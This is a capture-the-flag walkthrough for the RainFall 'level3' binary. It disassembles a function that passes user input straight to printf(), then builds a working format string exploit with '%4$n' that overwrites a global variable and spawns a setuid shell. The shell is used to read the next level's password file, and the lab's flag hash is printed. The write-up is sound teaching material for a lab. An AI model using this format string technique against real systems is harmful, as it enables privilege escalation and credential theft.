# Level3

As in level2, we can find an executable waiting for an input, print it and quit after press enter
```
level3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
level3@RainFall:~$ ./level3
bla
bla
level3@RainFall:~$
```
After analyze it with radare2 (please refer to [level1](https://github.com/maxisimo/42-RainFall/blob/main/level1/walkthrough.md) if you want more details on the steps to follow)  
We can see that the `main()` function call a function named `v()`.  
- main() :  
```
[0x080483f0]> s main
[0x0804851a]> pdda
    ; assembly                           | /* r2dec pseudo code output */
                                         | /* level3 @ 0x804851a */
                                         | #include <stdint.h>
                                         |
    ; (fcn) main ()                      | int32_t main (void) {
    0x0804851a push ebp                  |
    0x0804851b mov ebp, esp              |     
    0x0804851d and esp, 0xfffffff0       |
    0x08048520 call 0x80484a4            |     v ();
    0x08048525 leave                     |
    0x08048526 ret                       |
                                         | }
[0x0804851a]>
```
- v() :  
```
[0x0804851a]> s sym.v
[0x080484a4]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level3 @ 0x80484a4 */
                                                 | #include <stdint.h>
                                                 |
    ; (fcn) sym.v ()                             | int32_t v (void) {
                                                 |     char * format;
                                                 |     size_t size;
                                                 |     FILE * nitems;
                                                 |     FILE * stream;
    0x080484a4 push ebp                          |
    0x080484a5 mov ebp, esp                      |
    0x080484a7 sub esp, 0x218                    |
    0x080484ad mov eax, dword [0x8049860]        |     eax = stdin;
    0x080484b2 mov dword [esp + 8], eax          |     *((esp + 8)) = eax;
    0x080484b6 mov dword [esp + 4], 0x200        |     *((esp + 4)) = 0x200;
    0x080484be lea eax, [ebp - 0x208]            |     eax = ebp - 0x208;
    0x080484c4 mov dword [esp], eax              |
    0x080484c7 call 0x80483a0                    |     fgets (ebp);
    0x080484cc lea eax, [ebp - 0x208]            |     eax = ebp - 0x208;
    0x080484d2 mov dword [esp], eax              |
    0x080484d5 call 0x8048390                    |     printf (eax);
    0x080484da mov eax, dword [0x804988c]        |     eax = m;
    0x080484df cmp eax, 0x40                     |
                                                 |     if (eax == 0x40) {
    0x080484e2 jne 0x8048518                     |
    0x080484e4 mov eax, dword [0x8049880]        |         eax = stdout;
    0x080484e9 mov edx, eax                      |         edx = stdout;
    0x080484eb mov eax, 0x8048600                |         eax = "Wait what?!\n";
    0x080484f0 mov dword [esp + 0xc], edx        |         *((esp + 0xc)) = edx;
    0x080484f4 mov dword [esp + 8], 0xc          |         *((esp + 8)) = 0xc;
    0x080484fc mov dword [esp + 4], 1            |         *((esp + 4)) = 1;
    0x08048504 mov dword [esp], eax              |
    0x08048507 call 0x80483b0                    |         fwrite (eax);
    0x0804850c mov dword [esp], 0x804860d        |
    0x08048513 call 0x80483c0                    |         system ("/bin/sh");
                                                 |     }
    0x08048518 leave                             |
    0x08048519 ret                               |     return eax;
                                                 | }
[0x080484a4]>
```
Let focus on the `v()` function.  
We can see a call to `fgets()` function wich is protect against buffer overflow attack.  
```
    0x080484ad mov eax, dword [0x8049860]        |     eax = stdin;
    0x080484b2 mov dword [esp + 8], eax          |     *((esp + 8)) = eax;
    0x080484b6 mov dword [esp + 4], 0x200        |     *((esp + 4)) = 0x200;
    0x080484be lea eax, [ebp - 0x208]            |     eax = ebp - 0x208;
    0x080484c4 mov dword [esp], eax              |
    0x080484c7 call 0x80483a0                    |     fgets (ebp);
```
These lines are equivalent to `fgets(buffer[512], 512, stdin);` in pseudo C.  
But we can also see a call to `printf()` function wich is vulnerable to format string exploit!  
```
    0x080484d5 call 0x8048390                    |     printf (eax);
```
After that the program compares the value of a global variable `m` at "0x804988c" to 64.  
If the comparaison return true then the function will print "Wait what?!\n" and launch a shell via a call to `system()`.  
We need to manipulate `printf()` function into changing the value of the variable at the address `0x804988c`.  
First we need to print the memory until we reach the address of the variable we wish to modify :
```
level3@RainFall:~$ python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit | ./level3
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078
level3@RainFall:~$
```
Our buffer `aaaa` is at the 4th position (`61616161`). The modifier format `%x` allow us to print adress on the stack, cast on unsigned hexadecimal integer ([man printf](http://manpagesfr.free.fr/man/man3/printf.3.html))  
Now we can replace our buffer `aaaa` by the adress of the variable `m` in little endian.
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit | ./level3
 200 b7fd1ac0 b7ff37d0 804988c
level3@RainFall:~$
```
Good, the only last thing to do is that we don't want to print the memory, we want to change the content of the variable `m`.  
Don't forget that the variable `m` must have 64 bytes so we just have to add 60 bytes to the address passed before.  
The modifier `%n` will write the number of bytes specified before in the choosen address. We can specify the adress with %[number]$n option.  
Finally our final format string attack will look like :
- address of `m`        : 4 bytes
- pad of arbitrary data : 60 bytes
- modifier `%n`
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit - | ./level3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
^C
level3@RainFall:~$ su level4
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
level4@RainFall:~$
```
Level3 passed!
